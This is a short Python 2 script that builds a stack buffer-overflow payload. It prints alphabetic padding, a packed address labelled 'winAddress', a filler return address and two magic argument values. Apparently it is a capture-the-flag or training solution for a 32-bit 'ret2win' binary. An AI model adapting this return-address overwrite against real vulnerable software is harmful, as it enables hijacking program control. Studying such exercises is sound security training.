#!/usr/bin/python
import struct

padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbb"
winAddress = struct.pack("I", 0x80485cb)
returnAddress = "AAAA"
arg1 = struct.pack("I", 0xdeadbeef)
arg2 = struct.pack("I", 0xdeadc0de)

print padding + winAddress + returnAddress + arg1 + arg2